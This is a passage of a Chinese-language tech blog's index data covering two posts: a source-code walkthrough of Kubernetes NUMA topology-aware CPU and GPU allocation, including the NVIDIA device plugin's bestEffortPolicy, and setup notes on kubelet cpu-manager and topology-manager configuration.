","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:9:1","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"cpumanger 根据前面计算出的topo hint 进行cpu分配 func (p *staticPolicy) Allocate(s state.State, pod *v1.Pod, container *v1.Container) error { if numCPUs := p.guaranteedCPUs(pod, container); numCPUs != 0 { // Call Topology Manager to get the aligned socket affinity across all hint providers. hint := p.affinity.GetAffinity(string(pod.UID), container.Name) // Allocate CPUs according to the NUMA affinity contained in the hint. cpuset, err := p.allocateCPUs(s, numCPUs, hint.NUMANodeAffinity, p.cpusToReuse[string(pod.UID)]) s.SetCPUSet(string(pod.UID), container.Name, cpuset) p.updateCPUsToReuse(pod, container, cpuset) } // container belongs in the shared pool (nothing to do; use default cpuset) return nil } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:9:2","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"devicemanger devicemanger的资源分配逻辑处理逻辑较多。首先看下调用链，如下： Allocate -\u003e allocateContainerResources -\u003e devicesToAllocate // Returns list of device Ids we need to allocate with Allocate rpc call. // Returns empty list in case we don't need to issue the Allocate rpc call. func (m *ManagerImpl) devicesToAllocate(podUID, contName, resource string, required int, reusableDevices sets.String) (sets.String, error) { // Declare the list of allocated devices. // This will be populated and returned below. allocated := sets.NewString() // Create a closure to help with device allocation // Returns 'true' once no more devices need to be allocated. allocateRemainingFrom := func(devices sets.String) bool { for device := range devices.Difference(allocated) { m.allocatedDevices[resource].Insert(device) allocated.Insert(device) needed-- if needed == 0 { return true } } return false } // Allocates from reusableDevices list first. if allocateRemainingFrom(reusableDevices) { return allocated, nil } // Needs to allocate additional devices. if m.allocatedDevices[resource] == nil { m.allocatedDevices[resource] = sets.NewString() } // Gets Devices in use. devicesInUse := m.allocatedDevices[resource] // Gets Available devices. available := m.healthyDevices[resource].Difference(devicesInUse) if available.Len() \u003c needed { return nil, fmt.Errorf(\"requested number of devices unavailable for %s. Requested: %d, Available: %d\", resource, needed, available.Len()) } // Filters available Devices based on NUMA affinity. aligned, unaligned, noAffinity := m.filterByAffinity(podUID, contName, resource, available) // If we can allocate all remaining devices from the set of aligned ones, then // give the plugin the chance to influence which ones to allocate from that set. if needed \u003c aligned.Len() { // First allocate from the preferred devices list (if available). preferred, err := m.callGetPreferredAllocationIfAvailable(podUID, contName, resource, aligned.Union(allocated), allocated, required) if err != nil { return nil, err } if allocateRemainingFrom(preferred.Intersection(aligned)) { return allocated, nil } // Then fallback to allocate from the aligned set if no preferred list // is returned (or not enough devices are returned in that list). if allocateRemainingFrom(aligned) { return allocated, nil } return nil, fmt.Errorf(\"unexpectedly allocated less resources than required. Requested: %d, Got: %d\", required, required-needed) } // If we can't allocate all remaining devices from the set of aligned ones, // then start by first allocating all of the aligned devices (to ensure // that the alignment guaranteed by the TopologyManager is honored). if allocateRemainingFrom(aligned) { return allocated, nil } // Then give the plugin the chance to influence the decision on any // remaining devices to allocate. preferred, err := m.callGetPreferredAllocationIfAvailable(podUID, contName, resource, available.Union(allocated), allocated, required) if err != nil { return nil, err } if allocateRemainingFrom(preferred.Intersection(available)) { return allocated, nil } // Finally, if the plugin did not return a preferred allocation (or didn't // return a large enough one), then fall back to allocating the remaining // devices from the 'unaligned' and 'noAffinity' sets. if allocateRemainingFrom(unaligned) { return allocated, nil } if allocateRemainingFrom(noAffinity) { return allocated, nil } return nil, fmt.Errorf(\"unexpectedly allocated less resources than required. Requested: %d, Got: %d\", required, required-needed) } numa亲和性分配主要在filterByAffinity中 构造了perNodeDevices map对象: map[numaid]deivces 构造返回结果集：sets.NewString(fromAffinity…), sets.NewString(notFromAffinity…), sets.NewString(withoutTopology…), 即 基于numa亲和性从available资源中过滤出：aligned, unaligned, noAffinity func (m *ManagerImpl) filterByAffinity(podUID, contName, resource string, available sets.String) (sets.String, sets.String, sets.String) { // Build a map of NUMA Nodes to the devices associated with them. A // device may be associated to multi","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:9:3","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"接口 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:10:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"接口位置 kubernetes/staging/src/k8s.io/kubelet/pkg/apis/deviceplugin/v1beta1/api.proto // DevicePlugin is the service advertised by Device Plugins service DevicePlugin { // GetDevicePluginOptions returns options to be communicated with Device // Manager rpc GetDevicePluginOptions(Empty) returns (DevicePluginOptions) {} // ListAndWatch returns a stream of List of Devices // Whenever a Device state change or a Device disappears, ListAndWatch // returns the new list rpc ListAndWatch(Empty) returns (stream ListAndWatchResponse) {} // GetPreferredAllocation returns a preferred set of devices to allocate // from a list of available ones. The resulting preferred allocation is not // guaranteed to be the allocation ultimately performed by the // devicemanager. It is only designed to help the devicemanager make a more // informed allocation decision when possible. rpc GetPreferredAllocation(PreferredAllocationRequest) returns (PreferredAllocationResponse) {} // Allocate is called during container creation so that the Device // Plugin can run device specific operations and instruct Kubelet // of the steps to make the Device available in the container rpc Allocate(AllocateRequest) returns (AllocateResponse) {} // PreStartContainer is called, if indicated by Device Plugin during registeration phase, // before each container start. Device plugin can run device specific operations // such as resetting the device before making devices available to the container rpc PreStartContainer(PreStartContainerRequest) returns (PreStartContainerResponse) {}}// ListAndWatch returns a stream of List of Devices // Whenever a Device state change or a Device disappears, ListAndWatch // returns the new list message ListAndWatchResponse { repeated Device devices = 1;}message TopologyInfo { repeated NUMANode nodes = 1;}message NUMANode { int64 ID = 1;}/* E.g: * struct Device { * ID: \"GPU-fef8089b-4820-abfc-e83e-94318197576e\", * Health: \"Healthy\", * Topology: * Node: * ID: 1 *} */message Device { // A unique ID assigned by the device plugin used // to identify devices during the communication // Max length of this field is 63 characters string ID = 1; // Health of the device, can be healthy or unhealthy, see constants.go string health = 2; // Topology for device TopologyInfo topology = 3;} ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:10:1","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"NVIDIA k8s-device-plugin 插件版本：k8s-device-plugin-0.7.3 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:11:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"gpu device 目前插件对分配策略的参数配置如下 “nvidia.com/gpu\"的GPU资源，默认采用BestEffortPolicy plugins := []*NvidiaDevicePlugin{ NewNvidiaDevicePlugin( \"nvidia.com/gpu\", NewGpuDeviceManager(true), \"NVIDIA_VISIBLE_DEVICES\", gpuallocator.NewBestEffortPolicy(), pluginapi.DevicePluginPath+\"nvidia-gpu.sock\"), } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:11:1","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"处理流程 分析k8s-device-plugin对GetPreferredAllocation处理 对kubelet的请求参数AvailableDeviceIDs和MustIncludeDeviceIDs进行校验，构造available和required 按策略执行allocatePolicy.Allocate // GetPreferredAllocation returns the preferred allocation from the set of devices specified in the request func (m *NvidiaDevicePlugin) GetPreferredAllocation(ctx context.Context, r *pluginapi.PreferredAllocationRequest) (*pluginapi.PreferredAllocationResponse, error) { response := \u0026pluginapi.PreferredAllocationResponse{} for _, req := range r.ContainerRequests { available, err := gpuallocator.NewDevicesFrom(req.AvailableDeviceIDs) if err != nil { return nil, fmt.Errorf(\"Unable to retrieve list of available devices: %v\", err) } required, err := gpuallocator.NewDevicesFrom(req.MustIncludeDeviceIDs) if err != nil { return nil, fmt.Errorf(\"Unable to retrieve list of required devices: %v\", err) } allocated := m.allocatePolicy.Allocate(available, required, int(req.AllocationSize)) var deviceIds []string for _, device := range allocated { deviceIds = append(deviceIds, device.UUID) } resp := \u0026pluginapi.ContainerPreferredAllocationResponse{ DeviceIDs: deviceIds, } response.ContainerResponses = append(response.ContainerResponses, resp) } return response, nil } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:11:2","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"处理策略 GPU分配算法采用了策略模式，相关代码文件位置在 k8s-device-plugin\\vendor\\github.com\\NVIDIA\\go-gpuallocator\\gpuallocator gpu插件的资源分配算法已经封装为依赖包NVIDIA\\go-gpuallocator simplePolicy 算法思想 先选required，再从set(available - required)中，选择满足size大小的gpus数。 该算法简单且没有考虑任何GPU拓扑连接 // Allocate GPUs following a simple policy. func (p *simplePolicy) Allocate(available []*Device, required []*Device, size int) []*Device { if size \u003c= 0 { return []*Device{} } if len(available) \u003c size { return []*Device{} } if len(required) \u003e size { return []*Device{} } availableSet := NewDeviceSet(available...) if !availableSet.ContainsAll(required) { return []*Device{} } availableSet.Delete(required...) allocated := append([]*Device{}, required...) allocated = append(allocated, availableSet.SortedSlice()[:size-len(allocated)]...) return allocated } bestEffortPolicy 算法思想 Allocate从可用GPU设备列表中查找要分配的最佳大小GPU集，并返回它们。该算法旨在确保必需GPU设备的列表出现在最终分配中。 该算法考虑了大小为“size”的所有可能gpu集。然而，它并不满足于贪婪的解决方案，即寻找具有最高分数的单个大小集“size”。相反，当将节点上所有可用的gpu划分为大小为“size”的集合，然后将它们各自的分数相加时，它会寻找一种使总分最大化的解决方案。然后它返回该分组中具有最高得分的GPU集。 这种解决方案在一般情况下是必要的，因为各种链接的非层次性会影响每对gpu计算的分数。 // Allocate finds the best set of 'size' GPUs to allocate from a list of // available GPU devices and returns them. The algorithm is designed to // ensure that a list of 'required' GPU devices is present in the final // allocation. // // This algorithm considers all possible sets of GPUs of size 'size'. // However, it does not settle for the greedy solution of looking for the // single set of size 'size' with the highest score. Instead, it looks for a // solution that maximizes the total score when dividing up all available // GPUs on the node into sets of size 'size' and then summing their // individual scores. It then returns the set of GPUs from that grouping // with the highest individual score. // // Such a solution is necessary in the general case because of the // non-hierarchical nature of the various links that influence the score // calculated for each pair of GPUs. func (p *bestEffortPolicy) Allocate(available []*Device, required []*Device, size int) []*Device { if size \u003c= 0 { return []*Device{} } if len(available) \u003c size { return []*Device{} } if len(required) \u003e size { return []*Device{} } // Find the highest scoring GPU partition with sets of of size 'size'. // Don't consider partitions that don't have at least one set that contains // all of the GPUs 'required' by the allocation. // 1. 计算出得分最高的gpu分区（分组），该分区需要满足要分配size大小，并包含全部的'required' // gpuPartition对devices按size等分，e.g. [[0,1],[2,3]]；如果不能等分，则padding处理，填充devices。？？？ bestPartition := [][]*Device(nil) bestScore := 0 iterateGPUPartitions(available, size, func(candidate [][]*Device) { if !gpuPartitionContainsSetWithAll(candidate, required) { return } score := calculateGPUPartitionScore(candidate) if score \u003e bestScore || bestPartition == nil { bestPartition = candidate bestScore = score } }) // Filter the 'bestPartition' to only include sets containing all of the // 'required' devices (which may be nil so all sets will be valid). filteredBestPartition := [][]*Device{} for _, set := range bestPartition { if gpuSetContainsAll(set, required) { filteredBestPartition = append(filteredBestPartition, set) } } if len(filteredBestPartition) == 0 { return []*Device{} } // Find the highest scoring GPU set in the highest scoring GPU partition. // 在得分最高的分区中，找到得分最高的GPUset bestSet := filteredBestPartition[0] bestScore = calculateGPUSetScore(bestSet) for i := 1; i \u003c len(filteredBestPartition); i++ { score := calculateGPUSetScore(filteredBestPartition[i]) if score \u003e bestScore { bestSet = filteredBestPartition[i] bestScore = score } } // Return the highest scoring GPU set. return bestSet } 这里处理了gpuSet中的gpu拓扑得分，累计gpuSet中每对设备的得分PairScore，最后得出总分score // Get the total score of a set of GPUs. The score is calculated as the sum of // the scores calculated for each pair of GPUs in the set. func calculateGPUSetScore(gpuSet []*Device) int { score := 0 iterateGPUSets(gpuSet, 2, func(gpus []*Device) { score += calculateGPUPairScore(gpus[","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:11:3","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"gpu 拓扑 type P2PLinkType uint const ( P2PLinkUnknown P2PLinkType = iota P2PLinkCrossCPU P2PLinkSameCPU P2PLinkHostBridge P2PLinkMultiSwitch P2PLinkSingleSwitch P2PLinkSameBoard SingleNVLINKLink TwoNVLINKLinks ThreeNVLINKLinks FourNVLINKLinks FiveNVLINKLinks SixNVLINKLinks SevenNVLINKLinks EightNVLINKLinks NineNVLINKLinks TenNVLINKLinks ElevenNVLINKLinks TwelveNVLINKLinks ) func (t P2PLinkType) String() string { switch t { case P2PLinkCrossCPU: return \"Cross CPU socket\" case P2PLinkSameCPU: return \"Same CPU socket\" case P2PLinkHostBridge: return \"Host PCI bridge\" case P2PLinkMultiSwitch: return \"Multiple PCI switches\" case P2PLinkSingleSwitch: return \"Single PCI switch\" case P2PLinkSameBoard: return \"Same board\" case SingleNVLINKLink: return \"Single NVLink\" case TwoNVLINKLinks: return \"Two NVLinks\" case ThreeNVLINKLinks: return \"Three NVLinks\" case FourNVLINKLinks: return \"Four NVLinks\" case FiveNVLINKLinks: return \"Five NVLinks\" case SixNVLINKLinks: return \"Six NVLinks\" case SevenNVLINKLinks: return \"Seven NVLinks\" case EightNVLINKLinks: return \"Eight NVLinks\" case NineNVLINKLinks: return \"Nine NVLinks\" case TenNVLINKLinks: return \"Ten NVLinks\" case ElevenNVLINKLinks: return \"Eleven NVLinks\" case TwelveNVLINKLinks: return \"Twelve NVLinks\" case P2PLinkUnknown: } return \"N/A\" } 插件实例创建时NewDevices，会构造device信息，其中包括GPU拓扑连接信息 // Device represents a GPU device as reported by NVML, including all of its // Point-to-Point link information. type Device struct { *nvml.Device Index int Links map[int][]P2PLink } // P2PLink represents a Point-to-Point link between two GPU devices. The link // is between the Device struct this struct is embedded in and the GPU Device // contained in the P2PLink struct itself. type P2PLink struct { GPU *Device Type nvml.P2PLinkType } // DeviceSet is used to hold and manipulate a set of unique GPU devices. type DeviceSet map[string]*Device // Create a list of Devices from all available nvml.Devices. func NewDevices() ([]*Device, error) { devices = append(devices, \u0026Device{device, i, make(map[int][]P2PLink)}) for i, d1 := range devices { for j, d2 := range devices { if d1 != d2 { p2plink, err := nvml.GetP2PLink(d1.Device, d2.Device) if err != nil { return nil, fmt.Errorf(\"error getting P2PLink for devices (%v, %v): %v\", i, j, err) } if p2plink != nvml.P2PLinkUnknown { d1.Links[d2.Index] = append(d1.Links[d2.Index], P2PLink{d2, p2plink}) } nvlink, err := nvml.GetNVLink(d1.Device, d2.Device) if err != nil { return nil, fmt.Errorf(\"error getting NVLink for devices (%v, %v): %v\", i, j, err) } if nvlink != nvml.P2PLinkUnknown { d1.Links[d2.Index] = append(d1.Links[d2.Index], P2PLink{d2, nvlink}) } } } } return devices, nil } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:11:4","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"总结 kubelet根据所在节点可用资源和numa对齐准则，提供资源分配建议topo hint cpu资源分配，在cpu static分配策略下，由cpumanager根据计算好的topo hint进行cpuset分配 gpu资源分配：则由kubelet和gpu插件共同作用完成 kubelet会计算topo hint，并远程调用gpu插件的GetPreferredAllocation，提供gpu分配建议，包括request、available、size等 gpu插件根据分配建议，在bestEffortPolicy策略下，还会计算gpu device的拓扑得分，然后优选gpuset，并把该gpuset的devices返回给kubelet kbuelet根据gpu插件确认后的gpu devices，再校验处理，调用allocate，通知gpu插件进行资源分配 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:12:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"K8S1.20的kubelet的cpu和topo manager功能测试","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"1.20版本已经有了kubelet的numa亲和性资源（CPU和GPU）分配功能（与1.18版本的beta接口相同），本文记录操作要点 ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:0:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"配置kubelet 添加kubelet中numa相关的运行命令参数 --cpu-manager-policy=static --topology-manager-policy=best-effort kubelet的cpu-manager策略默认是none，会分配系统全部cpuset。这里需要显示指定策略 topology-manager-policy这里根据项目场景需要，配置best-effort：优选分配numa拓扑亲和性的资源，如果numa亲和性不满足，则分配系统可用资源。 cpu-manager策略默认配置 [root@gpu53 ~]# cat /var/lib/kubelet/cpu_manager_state {\"policyName\":\"none\",\"defaultCpuSet\":\"\",\"checksum\":1353318690} cpu-manager策略static配置 [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,4-27\",\"entries\":{\"39b37746-7f5e-4064-b8e1-eebd2bfaa003\":{\"app\":\"1-3\"}},\"checksum\":3300516549} ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:1:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"topology-manager-policy 注意  说明 none: this policy will not attempt to do any alignment of resources. It will act the same as if the TopologyManager were not present at all. This is the default policy. best-effort: with this policy, the TopologyManager will attempt to align allocations on NUMA nodes as best it can, but will always allow the pod to start even if some of the allocated resources are not aligned on the same NUMA node. restricted: this policy is the same as the best-effort policy, except it will fail pod admission if allocated resources cannot be aligned properly. Unlike with the single-numa-node policy, some allocations may come from multiple NUMA nodes if it is impossible to ever satisfy the allocation request on a single NUMA node (e.g. 2 devices are requested and the only 2 devices on the system are on different NUMA nodes). single-numa-node: this policy is the most restrictive and will only allow a pod to be admitted if all requested CPUs and devices can be allocated from exactly one NUMA node. ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:2:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"kubelet.env配置示例 /etc/kubernetes/kubelet.env 即在原有配置上增加 –cpu-manager-policy=static –topology-manager-policy=best-effort [root@node2 kubelet]# cat /etc/kubernetes/kubelet.env KUBE_LOGTOSTDERR=\"--logtostderr=true\" KUBE_LOG_LEVEL=\"--v=2\" KUBELET_ADDRESS=\"--node-ip=10.151.11.61\" KUBELET_HOSTNAME=\"--hostname-override=node2\" KUBELET_ARGS=\"--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf \\ --config=/etc/kubernetes/kubelet-config.yaml \\ --kubeconfig=/etc/kubernetes/kubelet.conf \\ --pod-infra-container-image=k8s.gcr.io/pause:3.2 \\ --authentication-token-webhook \\ --enforce-node-allocatable=\"\" \\ --client-ca-file=/etc/kubernetes/ssl/ca.crt \\ --rotate-certificates \\ --node-status-update-frequency=10s \\ --cgroup-driver=systemd \\ --cgroups-per-qos=False \\ --max-pods=110 \\ --anonymous-auth=false \\ --read-only-port=0 \\ --fail-swap-on=True \\ --runtime-cgroups=/systemd/system.slice --kubelet-cgroups=/systemd/system.slice \\ --cluster-dns=10.233.0.3 --cluster-domain=cluster.local --resolv-conf=/etc/resolv.conf --node-labels= --eviction-hard=\"\" --image-gc-high-threshold=100 --image-gc-low-threshold=99 --kube-reserved cpu=100m --system-reserved cpu=100m \\ --cpu-manager-policy=static --topology-manager-policy=best-effort \\ \" KUBELET_NETWORK_PLUGIN=\"--network-plugin=cni --cni-conf-dir=/etc/cni/net.d --cni-bin-dir=/opt/cni/bin\" KUBELET_CLOUDPROVIDER=\"\" PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:3:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"kubelet重启 注意：kubelet修改cpu_manager策略配置，一定要停掉kubelet服务，并删除/var/lib/kubelet/cpu_manager_state文件，再重启kubelet，否则会导致kubelet服务重启失败。 ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:4:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"启动GPU k8s插件 需要支持CPUManager static policy 这里采用镜像方式启动，详细操作参考K8S GPU DEVICEPLUGIN docker run \\ -it \\ --privileged \\ --network=none \\ -v /var/lib/kubelet/device-plugins:/var/lib/kubelet/device-plugins \\ nvidia/k8s-device-plugin:devel --pass-device-specs ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:5:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"kubelet的快照文件 cpu_manager_state：CPU管理器快照文件，包含cpu分配策略和已分配pod的cpuset信息 device-plugins/kubelet_internal_checkpoint：deviceplugin的快照信息，这里关注测试numa亲和性分配相关的TOPO分配信息 ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:6:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"GPU命令 ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:7:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"GPU uuid nvidia-smi -L 显示如下，查询到INDEX -\u003e UUID： [root@node2 ~]# nvidia-smi -L GPU 0: Tesla P100-PCIE-16GB (UUID: GPU-77a702db-e37f-3a74-d46d-c5713f66058c) GPU 1: Tesla P100-PCIE-16GB (UUID: GPU-9b341c59-f96b-ba85-c137-78c3652fea65) GPU 2: Tesla P100-PCIE-16GB (UUID: GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841) ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:7:1","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"GPU 详细信息 lspci | grep -i nvidia [root@node2 ~]# lspci | grep -i nvidia 3b:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) 86:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) d8:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) 前边的序号 “3b:00.0\"是显卡的代号; 查看指定显卡的详细信息用以下指令： lspci -v -s 3b:00.0 这里能看到NUMA node 1 [root@node2 ~]# lspci -v -s d8:00.0 d8:00.0 3D controller: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] (rev a1) Subsystem: NVIDIA Corporation Device 118f Flags: bus master, fast devsel, latency 0, IRQ 441, NUMA node 1 Memory at fa000000 (32-bit, non-prefetchable) [size=16M] Memory at 39f800000000 (64-bit, prefetchable) 